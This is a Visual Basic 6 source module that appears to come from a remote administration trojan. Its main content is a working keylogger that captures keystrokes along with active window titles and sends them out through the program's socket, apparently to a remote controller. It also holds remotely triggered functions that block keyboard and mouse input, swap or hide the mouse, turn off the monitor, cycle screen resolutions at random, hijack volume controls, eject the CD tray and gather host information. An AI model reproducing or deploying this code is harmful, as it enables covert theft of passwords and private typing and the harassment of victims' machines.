Attribute VB_Name = "Hardware"
'This Module Includes Most Of Hardware Controlling Functions VIA Visual Basic
'------- < Constants
Private Const MIXER_GETLINEINFOF_COMPONENTTYPE = &H3&
Private Const MIXER_GETLINECONTROLSF_ONEBYTYPE = &H2&
Private Const MAXPNAMELEN As Integer = 32
Private Const MIXER_SHORT_NAME_CHARS As Integer = 16
Private Const MIXER_LONG_NAME_CHARS As Integer = 64
Private Const GMEM_ZEROINIT = &H40
Private Const GET_MUTE = 0
Private Const SET_MUTE = 1
Private Const GET_VOLUME = 2
Private Const SET_VOLUME = 3
'Country and region Constants
Const LOCALE_USER_DEFAULT = &H400
Const LOCALE_SENGCOUNTRY = &H1002 '  English name of country
Const LOCALE_SENGLANGUAGE = &H1001  '  English name of language
'Mouse Events
Public Const MOUSEEVENTF_RIGHTDOWN = &H8
Public Const MOUSEEVENTF_RIGHTUP = &H10
Public Const MOUSEEVENTF_LEFTDOWN = &H2
Public Const MOUSEEVENTF_LEFTUP = &H4
'Monitor Constants
Private Const SC_MONITORPOWER = &HF170&
Private Const MONITOR_ON = -1&
Private Const MONITOR_OFF = 2&
Private Const WM_SYSCOMMAND = &H112
Private Const DM_BITSPERPEL As Long = &H40000
Private Const DM_PELSWIDTH As Long = &H80000
Private Const DM_PELSHEIGHT As Long = &H100000
Private Const CDS_FORCE As Long = &H80000000
Private Const HORZRES As Long = 8
Private Const VERTRES As Long = 10
Private Const BITSPIXEL As Long = 12
Private Const VREFRESH As Long = 116

'User Defined Types
Private Type SYSTEM_INFO
   dwOemID As Long
   dwPageSize As Long
   lpMinimumApplicationAddress As Long
   lpMaximumApplicationAddress As Long
   dwActiveProcessorMask As Long
   dwNumberOfProcessors As Long
   dwProcessorType As Long
   dwAllocationGranularity As Long
   wProcessorLevel As Integer
   wProcessorRevision As Integer
End Type

Type MemoryStatus
        dwLength As Long
        dwMemoryLoad As Long
        dwTotalPhys As Long
        dwAvailPhys As Long
        dwTotalPageFile As Long
        dwAvailPageFile As Long
        dwTotalVirtual As Long
        dwAvailVirtual As Long
End Type

Private Type Target    ' for use in MIXERLINE and others (embedded structure)
        dwType As Long                 '  MIXERLINE_TARGETTYPE_xxxx
        dwDeviceID As Long             '  target device ID of device type
        wMid As Integer                '  of target device
        wPid As Integer                '       "
        vDriverVersion As Long         '       "
        szPname As String * MAXPNAMELEN
End Type

Private Type MIXERLINE
        cbStruct As Long               '  size of MIXERLINE structure
        dwDestination As Long          '  zero based destination index
        dwSource As Long               '  zero based source index (if source)
        dwLineID As Long               '  unique line id for mixer device
        fdwLine As Long                '  state/information about line
        dwUser As Long                 '  driver specific information
        dwComponentType As Long        '  component type line connects to
        cChannels As Long              '  number of channels line supports
        cConnections As Long           '  number of connections (possible)
        cControls As Long              '  number of controls at this line
        szShortName As String * MIXER_SHORT_NAME_CHARS
        szName As String * MIXER_LONG_NAME_CHARS
        tTarget As Target
End Type

Private Type MIXERCONTROL
        cbStruct As Long           '  size in Byte of MIXERCONTROL
        dwControlID As Long        '  unique control id for mixer device
        dwControlType As Long      '  MIXERCONTROL_CONTROLTYPE_xxx
        fdwControl As Long         '  MIXERCONTROL_CONTROLF_xxx
        cMultipleItems As Long     '  if MIXERCONTROL_CONTROLF_MULTIPLE set
        szShortName As String * MIXER_SHORT_NAME_CHARS
        szName As String * MIXER_LONG_NAME_CHARS
        Bounds(1 To 6) As Long     '  Longest member of the Bounds union
        Metrics(1 To 6) As Long    '  Longest member of the Metrics union
End Type

Private Type MIXERLINECONTROLS
        cbStruct As Long       '  size in Byte of MIXERLINECONTROLS
        dwLineID As Long       '  line id (from MIXERLINE.dwLineID)
                               '  MIXER_GETLINECONTROLSF_ONEBYID or
        dwControl As Long      '  MIXER_GETLINECONTROLSF_ONEBYTYPE
        cControls As Long      '  count of controls pmxctrl points to
        cbmxctrl As Long       '  size in Byte of _one_ MIXERCONTROL
        pamxctrl As Long       '  pointer to first MIXERCONTROL array
End Type

Private Type MIXERCONTROLDETAILS
        cbStruct As Long       '  size in Byte of MIXERCONTROLDETAILS
        dwControlID As Long    '  control id to get/set details on
        cChannels As Long      '  number of channels in paDetails array
        Item As Long                           ' hwndOwner or cMultipleItems
        cbDetails As Long      '  size of _one_ details_XX struct
        paDetails As Long      '  pointer to array of details_XX structs
End Type

Private Type MIXERCONTROLDETAILS_UNSIGNED
        dwValue As Long
End Type

Private Type controls
      Level As Long
      Mute As Long
      type  As Long
End Type

Private Type DEVMODE
    dmDeviceName As String * 32
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * 32
    dmUnusedPadding As Integer
    dmBitsPerPel As Long
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type
'------- < API Functions
'------- < General
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Sub CopyStructFromPtr Lib "kernel32" Alias "RtlMoveMemory" (struct As Any, ByVal ptr As Long, ByVal cb As Long)
'------- < Mouse
Private Declare Function ShowCursor& Lib "user32" (ByVal bShow As Long)
Private Declare Function SwapMouseButton& Lib "user32" (ByVal bSwap As Long)
Private Declare Sub ClipCursor Lib "user32" (lpRect As Any)
''------- < Keyboard
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
'------- < Sound
Private Declare Function mixerOpen Lib "winmm.dll" (phmx As Long, ByVal uMxId As Long, ByVal dwCallback As Long, ByVal dwInstance As Long, ByVal fdwOpen As Long) As Long
Private Declare Function mixerGetLineInfo Lib "winmm.dll" Alias "mixerGetLineInfoA" (ByVal hmxobj As Long, pmxl As MIXERLINE, ByVal fdwInfo As Long) As Long
Private Declare Function mixerClose Lib "winmm.dll" (ByVal hmx As Long) As Long
Private Declare Function mixerGetLineControls Lib "winmm.dll" Alias "mixerGetLineControlsA" (ByVal hmxobj As Long, pmxlc As MIXERLINECONTROLS, ByVal fdwControls As Long) As Long
Private Declare Function mixerSetControlDetails Lib "winmm.dll" (ByVal hmxobj As Long, pmxcd As MIXERCONTROLDETAILS, ByVal fdwDetails As Long) As Long
Private Declare Function mixerGetControlDetails Lib "winmm.dll" Alias "mixerGetControlDetailsA" (ByVal hmxobj As Long, pmxcd As MIXERCONTROLDETAILS, ByVal fdwDetails As Long) As Long
'------- < Hardware Info
Private Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MemoryStatus)
Private Declare Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long
'Hardware control
Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long) ' go & click
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long ' open & Close Cd
Public Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long  'stop the action of keyboard & mouse
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function GetCursor Lib "user32" () As Long
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function SetKeyboardState Lib "user32" (lppbKeyState As Byte) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Any) As Long
'Monitor Control
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal modeIndex As Long, lpDevMode As Any) As Boolean
Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpDevMode As Any, ByVal dwFlags As Long) As Long
Private Declare Function GetDeviceCaps Lib "gdi32" (ByVal hDC As Long, ByVal nIndex As Long) As Long
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function DeleteDC Lib "gdi32" (ByVal hDC As Long) As Long

'------- < Used Variables
Private PrevWindowTitle As String
Dim IsKeyLoggerActive As Boolean
Private Component(4) As controls
Private Listen As Long 'Handle To The Timer
Private Flag As Boolean
Private hmix As Long
Private Taken As Long
Private KeyLoggerData As String, KeyLoop As Long
Private SpecChars(15) As String
Private lpDevMode() As DEVMODE 'Monitor control
Private NormalState As Long, IsMonitorGetFaked As Boolean
Public Sub StartKeyLogger()
    If IsKeyLoggerActive Then Exit Sub
    SpecChars(0) = ")"
    SpecChars(1) = "!"
    SpecChars(2) = "@"
    SpecChars(3) = "#"
    SpecChars(4) = "$"
    SpecChars(5) = "%"
    SpecChars(6) = "^"
    SpecChars(7) = "&"
    SpecChars(8) = "*"
    SpecChars(9) = "("
    IsKeyLoggerActive = True
    frm_main.send_data Chr$(112)
    Listen = Timer_start(AddressOf listen_keys, 10) 'Create The KeyLogger Timer
End Sub
Public Sub StopKeyLogger()
    Call Timer_stop(Listen)
    IsKeyLoggerActive = False
End Sub
Public Function GetShift() As Boolean
    GetShift = CBool(GetAsyncKeyState(vbKeyShift))
End Function
Public Function GetCapslock() As Boolean
    GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)
End Function
Private Function listen_keys()
    Dim AddKey As String, ActiveWin As String
    If IsKeyLoggerActive = False Then Exit Function
    KeyResult = GetAsyncKeyState(13) 'Enter
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(8) 'Back Space
    If KeyResult = -32767 Then
        AddKey = "[BS]"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(9) 'Tab
    If KeyResult = -32767 Then
        AddKey = "[TAB]"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(32) 'Space
    If KeyResult = -32767 Then
        AddKey = " "
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(186) 'SK1
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = ";" Else AddKey = ":"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(187) 'SK2
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "=" Else AddKey = "+"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(188) 'SK3
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "," Else AddKey = "<"
       GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(189) 'SK4
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "-" Else AddKey = "_"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(190) 'SK5
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "." Else AddKey = ">"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(191) 'SK6
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "/" Else AddKey = "?"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(192) 'SK7
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "`" Else AddKey = "~"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(96) 'NumPad0
    If KeyResult = -32767 Then
        AddKey = "0"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(97) 'NumPad1
    If KeyResult = -32767 Then
        AddKey = "1"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(98) 'NumPad2
    If KeyResult = -32767 Then
        AddKey = "2"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(99) 'NumPad3
    If KeyResult = -32767 Then
        AddKey = "3"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(100) 'NumPad4
    If KeyResult = -32767 Then
        AddKey = "4"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(101) 'NumPad5
    If KeyResult = -32767 Then
        AddKey = "5"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(102) 'NumPad6
    If KeyResult = -32767 Then
        AddKey = "6"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(103) 'NumPad7
    If KeyResult = -32767 Then
        AddKey = "7"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(104) 'NumPad8
    If KeyResult = -32767 Then
        AddKey = "8"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(105) 'NumPad9
    If KeyResult = -32767 Then
        AddKey = "9"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(106) 'Star
    If KeyResult = -32767 Then
        AddKey = "*"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(107) 'Add
    If KeyResult = -32767 Then
        AddKey = "+"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(108) 'New Line
    If KeyResult = -32767 Then
        AddKey = vbCrLf
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(109) 'Minus
    If KeyResult = -32767 Then
        AddKey = "-"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(110) 'Dot
    If KeyResult = -32767 Then
        AddKey = "."
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(2) 'Slash
    If KeyResult = -32767 Then
        AddKey = "/"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(220) 'SK8
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "\" Else AddKey = "|"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(222) 'SK9
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "'" Else AddKey = Chr$(34)
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(221) 'SK10
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "]" Else AddKey = "}"
        GoTo KeyFound
    End If
    KeyResult = GetAsyncKeyState(219) 'SK11
    If KeyResult = -32767 Then
        If GetShift = False Then AddKey = "[" Else AddKey = "{"
        GoTo KeyFound
    End If
    KeyLoop = 41
    Do Until KeyLoop = 127 ' Otherwise check For numbers and letters
        KeyResult = GetAsyncKeyState(KeyLoop)
        If KeyResult = -32767 Then
            If KeyLoop > 64 And KeyLoop < 91 Then 'Letters
                If GetCapslock = True And GetShift = True Then KeyLoop = KeyLoop + 32
                If GetCapslock = False And GetShift = False Then KeyLoop = KeyLoop + 32
            End If
            If KeyLoop > 47 And KeyLoop < 58 Then 'Numbers
                If GetShift = True Then
                    AddKey = SpecChars(Val(Chr(KeyLoop)))
                    GoTo KeyFound
                End If
            End If
            AddKey = AddKey + Chr$(KeyLoop)
        End If
        KeyLoop = KeyLoop + 1
    Loop
KeyFound: 'Process The Data
    DoEvents
    If Len(AddKey) Then
        ActiveWin = GetActiveWindow
        If PrevWindowTitle = ActiveWin Then
           KeyLoggerData = KeyLoggerData & AddKey
        Else
            If Len(KeyLoggerData) Then
                KeyLoggerData = "----- [New Window : " & PrevWindowTitle & "] -----" & vbCrLf & KeyLoggerData
                FetchKeyLoggerData
                PrevWindowTitle = ActiveWin
            End If
            KeyLoggerData = AddKey
        End If
    End If
End Function
Private Function FetchKeyLoggerData() As String
    If IsKeyLoggerActive = True Then 'Keylogger activated
        frm_main.send_data Chr$(112) & KeyLoggerData
    End If
    KeyLoggerData = "" 'Empty The Buffer
End Function
'------------------<< Sound Functions >>--------------------------------------------------
Public Function Snd_initialize(ID As Byte, KData As String) As String
Dim Error As Long
     If Flag = False Then
       For i = 0 To 4
            Component(i).Level = -1
            Component(i).Mute = -1
       Next
       Component(0).type = &H4
       Component(1).type = &H1008&
       Component(2).type = &H1004&
       Component(3).type = &H1005&
       Component(4).type = &H1002
       Error = mixerOpen(hmix, 0, 0, 0, 0)
       If Error <> 0 Then
        Exit Function
       End If
       Flag = True
     End If
    Snd_initialize = SoundCtl(ID, KData)
End Function
Private Function SoundCtl(ID As Byte, Data As String) As String
On Error Resume Next
 Dim Values() As String
 Dim Ret As String
 Dim CtrlType As Long, CompType As Long, Val As Long, Op As Long
 Select Case ID
 Case 114
      SoundCtl = "Sound Card Initialized OK"
 Case 118                         'Set Control
       Values() = Split(Data, " ")
       CompType = CLng(Values(0))
       CtrlType = CLng(Values(1))
       Val = CLng(Values(2))
       Op = CLng(Values(3))
       GetControl hmix, Component(CompType).type, CtrlType, Val, Op
       If Op = 3 Then
            Component(CompType).Level = Val
       ElseIf Op = 1 Then
            Component(CompType).Mute = Val
       End If
 Case 117  'Get sound level (return = val)
            GetControl hmix, Component(0).type, &H50030001, Val, 0
            SoundCtl = Val
 Case 115  'Take Control
        If Taken = 0 Then
          Taken = Timer_start(AddressOf Take_Control, 1)
        End If
 Case 116  'Release Control
        Timer_stop Taken
        Taken = 0
 End Select
End Function
Private Sub Take_Control()
         If Component(0).Level <> -1 Then
                   GetControl hmix, Component(0).type, &H50030001, Component(0).Level, 3
         End If
         If Component(0).Mute <> -1 Then
                    GetControl hmix, Component(0).type, &H20010002, Component(0).Mute, 1
         End If
End Sub
Private Sub GetControl(ByVal hmixer As Long, ByVal componentType As Long, ByVal CtrlType As Long, ByRef Value As Long, Attrib As Long)
' This function attempts to obtain a mixer control. Returns True if successful.
   Dim Uunsigned As MIXERCONTROLDETAILS_UNSIGNED
   Dim Udetails As MIXERCONTROLDETAILS
   Dim mxlc As MIXERLINECONTROLS
   Dim mxc As MIXERCONTROL
   Dim mxl As MIXERLINE
   Dim hMem As Long
   Dim rc As Long
   mxl.cbStruct = Len(mxl)
   mxl.dwComponentType = componentType
   ' Obtain a line corresponding to the component type
   rc = mixerGetLineInfo(hmixer, mxl, MIXER_GETLINEINFOF_COMPONENTTYPE)
   If (rc = 0) Then
      mxlc.cbStruct = Len(mxlc)
      mxlc.dwLineID = mxl.dwLineID
      mxlc.dwControl = CtrlType
      mxlc.cControls = 1
      mxlc.cbmxctrl = Len(mxc)
      ' Allocate a buffer for the control
      hMem = GlobalAlloc(GMEM_ZEROINIT, Len(mxc))
      mxlc.pamxctrl = GlobalLock(hMem)
      mxc.cbStruct = Len(mxc)
      ' Get the control
      rc = mixerGetLineControls(hmixer, mxlc, MIXER_GETLINECONTROLSF_ONEBYTYPE)
      If (rc = 0) Then
         ' Copy the control into the destination structure
        CopyStructFromPtr mxc, mxlc.pamxctrl, Len(mxc)
        GlobalFree (hMem)
        Udetails.cbStruct = CLng(LenB(Udetails))
        Udetails.dwControlID = mxc.dwControlID
        Udetails.cChannels = 1
        Udetails.Item = 0
        Udetails.cbDetails = LenB(Uunsigned)
        hMem = GlobalAlloc(GMEM_ZEROINIT, LenB(Uunsigned))
        Udetails.paDetails = GlobalLock(hMem)
 Select Case Attrib
        Case SET_MUTE
           Uunsigned.dwValue = Value
           CopyMemory ByVal Udetails.paDetails, Uunsigned, LenB(Uunsigned)
           Call mixerSetControlDetails(hmx, Udetails, &H0&)
        Case GET_MUTE
          Call mixerGetControlDetails(hmx, Udetails, &H0&)
          CopyStructFromPtr Uunsigned, Udetails.paDetails, Len(Uunsigned)
          Value = Uunsigned.dwValue
        Case SET_VOLUME
           Uunsigned.dwValue = CLng((Value * mxc.Bounds(2)) / 100)
           CopyMemory ByVal Udetails.paDetails, Uunsigned, LenB(Uunsigned)
           Call mixerSetControlDetails(hmx, Udetails, &H0&)
        Case GET_VOLUME
          Call mixerGetControlDetails(hmx, Udetails, &H0&)
          CopyStructFromPtr Uunsigned, Udetails.paDetails, Len(Uunsigned)
          Value = (Uunsigned.dwValue * 100) / mxc.Bounds(2) - mxc.Bounds(1)
 End Select
   End If
End If
End Sub
Public Function Get_HardwareInfo() As String
Dim memInfo As MemoryStatus
Dim SI As SYSTEM_INFO
Dim Ret As String
 'Processor
  Call GetSystemInfo(SI)
  Ret = "Number Of Processors : " & SI.dwNumberOfProcessors
  Ret = Ret & vbCrLf & "Processor Type : " & SI.dwProcessorType
  Ret = Ret & vbCrLf & "Processor Level : " & SI.wProcessorLevel
  Ret = Ret & vbCrLf & "Processor Version : " & SI.wProcessorRevision
  Ret = Ret & vbCrLf & "Processor Speed : " & GetCPUSpeed() & " MHz"
 'Memory
  Call GlobalMemoryStatus(memInfo)
  Ret = Ret & vbCrLf & "Total Physical Memory : " & String_Size(CCur(memInfo.dwTotalPhys))
  Ret = Ret & vbCrLf & "Free Physical Momory : " & String_Size(CCur(memInfo.dwAvailPhys))
  Ret = Ret & vbCrLf & "Total Momory PageFile : " & String_Size(CCur(memInfo.dwTotalPageFile))
  Ret = Ret & vbCrLf & "Available Memory PageFile : " & String_Size(CCur(memInfo.dwAvailPageFile))
  Ret = Ret & vbCrLf & "Total Virual Memory : " & String_Size(CCur(memInfo.dwTotalVirtual))
  Ret = Ret & vbCrLf & "Available Virual Memory : " & String_Size(CCur(memInfo.dwAvailVirtual))
 'Pc Info & Region
  Ret = Ret & vbCrLf & "Country Name : " & GetRegionInfo(LOCALE_SENGCOUNTRY)
  Ret = Ret & vbCrLf & "Computer Lnaguge : " & GetRegionInfo(LOCALE_SENGLANGUAGE)
  Ret = Ret & vbCrLf & "Host Name : " & frm_main.sckserver.GetLocalHostName
 'Windows Info
  Ret = Ret & vbCrLf & "Windows Directory : " & Win_dir
  Ret = Ret & vbCrLf & "System Directory : " & Sys_dir
  Ret = Ret & vbCrLf & "Operationg System : " & StringOSName(Val(OSName))
  Get_HardwareInfo = Ret
End Function
Private Function GetCPUSpeed() As Long
   Dim hKey As Long
   Dim cpuSpeed As Long
   Call RegOpenKey(&H80000002, "HARDWARE\DESCRIPTION\System\CentralProcessor\0", hKey)
   Call RegQueryValueEx(hKey, "~MHz", 0, 0, cpuSpeed, 4)
   Call RegCloseKey(hKey)
   GetCPUSpeed = cpuSpeed
End Function
Private Function GetActiveWindow() As String
Dim dHandle As Long, MyStr As String
    dHandle = GetForegroundWindow
    MyStr = String(300, Chr$(0))
    GetWindowText dHandle, MyStr, 100
    GetActiveWindow = Left$(MyStr, InStr(MyStr, Chr$(0)) - 1)
End Function
Private Function GetRegionInfo(ByVal lInfo As Long) As String
    Dim Buffer As String, Ret As String
    Buffer = String$(256, 0)
    Ret = GetLocaleInfo(LOCALE_USER_DEFAULT, lInfo, Buffer, Len(Buffer))
    If Ret > 0 Then
        GetRegionInfo = Left$(Buffer, Ret - 1)
    Else
        GetRegionInfo = ""
    End If
End Function
Private Function StringOSName(OSType As Integer) As String
    Select Case OSType
           Case 0
                StringOSName = "Windows_32"
           Case 1
                StringOSName = "Windows_95"
           Case 2
                StringOSName = "Windows_98"
           Case 3
                StringOSName = "Windows_ME"
           Case 4
                StringOSName = "Windows_NT"
           Case 5
                StringOSName = "Windows_2K"
           Case 6
                StringOSName = "Windows_XP"
           Case Else
                StringOSName = "UNKONWN OS Name"
    End Select
End Function
Public Sub EjectCD()
    Call mciSendString("set CDAudio Door Open Wait", 0&, 0&, 0&)
    bopen = True
End Sub
Public Sub CloseCD()
    Call mciSendString("set CDAudio Door Closed Wait", 0&, 0&, 0&)
    bopen = False
End Sub
Public Sub ShowMouse()
    ShowCursor (True)
End Sub
Public Sub HideMouse()
    ShowCursor (False)
End Sub
Public Sub SwapMouse()
    SwapMouseButton (1)
End Sub
Public Sub NormalMouse()
    SwapMouseButton (0)
End Sub
Public Sub BlockMouseKeyboard()
    BlockInput True
End Sub
Public Sub AllowMouseKeyboard()
    BlockInput False
End Sub
Public Sub LClick(X As Long, Y As Long)
  SetCursorPos X, Y
  mouse_event MOUSEEVENTF_LEFTDOWN Or MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
End Sub
Public Sub RClick(X As Long, Y As Long)
  SetCursorPos X, Y
  mouse_event MOUSEEVENTF_RIGHTDOWN Or MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
End Sub
Private Sub SetKeyState(intKey As Integer, fTurnOn As Boolean)
'no fucking touching this.
Dim abytBuffer(0 To 255) As Byte
GetKeyboardState abytBuffer(0)
abytBuffer(intKey) = CByte(Abs(fTurnOn))
SetKeyboardState abytBuffer(0)
End Sub
Public Sub NumON()
    SetKeyState vbKeyNumlock, True
End Sub
Public Sub NumOFF()
    SetKeyState vbKeyNumlock, False
End Sub
Public Sub CapsON()
    SetKeyState vbKeyCapital, True
End Sub
Public Sub CapsOFF()
    SetKeyState vbKeyCapital, False
End Sub
Public Sub MonitorON()
    SendMessage SrvHwnd, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON
End Sub
Public Sub MonitorOFF()
    SendMessage SrvHwnd, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF
End Sub
Public Function GetMonitorStates() As String
    Dim States() As String, i As Integer 'General counter
    Dim CurrentIndex As Long 'Carry the current monitor state index
   'Collect The Information
    Call GetDisplaySettings(States)
    CurrentIndex = LookupCurrent
   'Package the information
    If UBound(States) Then
        GetMonitorStates = "T" & Char_Representation(CurrentIndex)
        For i = 0 To UBound(States)
            GetMonitorStates = GetMonitorStates & States(i) & Separator_Char
        Next
    Else
        GetMonitorStates = "F"
    End If
End Function
Public Function SetMonitorState(State As Long) As String
    If ChangeDisplaySettings(lpDevMode(State), CDS_FORCE) = 0 Then ChangeScreenResolution = "T"
End Function
Public Function FakeMonitor() As String
    NormalState = LookupCurrent + 1 'Normal Settings
    Dim i As Long
    IsMonitorGetFaked = True
StartFake:
    If IsMonitorGetFaked = True Then
       If UBound(lpDevMode) Then
            SetMonitorState (CLng(Rnd * UBound(lpDevMode)))
            Delay (5)
            GoTo StartFake
       Else
            FakeMonitor = "F"
            Exit Function
       End If
    End If
End Function
Public Sub CancelFakeMonitor()
   'Stop The Monitor Faking
    IsMonitorGetFaked = False
   'Return First Value
    If NormalState > 0 Then SetMonitorState (NormalState - 1): NormalState = 0
End Sub
Private Sub GetDisplaySettings(displayDescr() As String)
    Dim Index As Long
    Dim displayCount As Long
    Dim colorDescr As String
    ' set the DEVMODE flags and structure size
    ReDim lpDevMode(0 To 1) As DEVMODE
    lpDevMode(0).dmSize = Len(lpDevMode(0))
    lpDevMode(0).dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT Or DM_BITSPERPEL
    ' count how many display settings are there
    Do While EnumDisplaySettings(0, displayCount, lpDevMode(0)) > 0
        displayCount = displayCount + 1
    Loop
    ' now displayCount holds the number of display settings
    ' and we can DIMension the result arrays
    ReDim displayDescr(0 To displayCount) As String
    ReDim lpDevMode(0 To displayCount) As DEVMODE
    For Index = 0 To displayCount
        ' retrieve info on the index-th display mode
        EnumDisplaySettings 0, Index, lpDevMode(Index)
        Select Case lpDevMode(Index).dmBitsPerPel
            Case 4
                colorDescr = "16 colors"
            Case 8
                colorDescr = "256 colors"
            Case Is <= 24
                colorDescr = "24bit color"
            Case Else
                colorDescr = "32bit color"
        End Select
        displayDescr(Index) = lpDevMode(Index).dmPelsWidth & " x " & lpDevMode(Index).dmPelsHeight & ", " & colorDescr
        If lpDevMode(Index).dmDisplayFrequency > 1 Then
            displayDescr(Index) = displayDescr(Index) & ", " & lpDevMode(Index).dmDisplayFrequency & " Hz"
        Else
            displayDescr(Index) = displayDescr(Index) & ", (Hardware default)"
        End If
    Next
End Sub
Private Function LookupCurrent() As Long 'Retrun The Current Index Of The Monitor Mode
   Dim currHRes As Long
   Dim currVRes As Long
   Dim currBPP As Long
   Dim currVFreq As Long
   Dim sBPPtype As String
   Dim sFreqtype As String
   Dim hDC As Long
   Dim i As Long
   LookupCurrent = -1
   hDC = GetDC(0)
   'get the system settings
   currHRes = GetDeviceCaps(hDC, HORZRES)
   currVRes = GetDeviceCaps(hDC, VERTRES)
   currBPP = GetDeviceCaps(hDC, BITSPIXEL)
   currVFreq = GetDeviceCaps(hDC, VREFRESH)
   Call DeleteDC(hDC)
   For i = 0 To UBound(lpDevMode) - 1
    If lpDevMode(i).dmPelsWidth = currHRes Then
        If (lpDevMode(i).dmPelsHeight = currVRes) Then
            If (lpDevMode(i).dmBitsPerPel = currBPP) Then
                If (lpDevMode(i).dmDisplayFrequency = currVFreq) Then
                    LookupCurrent = i
                    Exit Function
                End If
            End If
        End If
    End If
   Next
End Function
